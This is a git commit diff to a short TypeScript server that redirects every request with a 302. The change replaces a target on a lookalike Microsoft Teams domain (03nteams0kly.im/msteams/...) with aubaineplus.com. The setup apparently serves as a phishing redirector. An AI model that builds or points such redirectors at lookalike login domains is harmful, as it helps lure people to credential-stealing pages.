1316c775e31f0594b9988a8c07f01d32a994dc59
Digital2025001 <bosmichael30@gmail.com>
2025-12-14 07:21:29 -0800

    Update main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://03nteams0kly.im/msteams/teamsn/teams/", // Replace this with your actual link
+      Location: "https://aubaineplus.com/", // Replace this with your actual link
     },
   });
 });
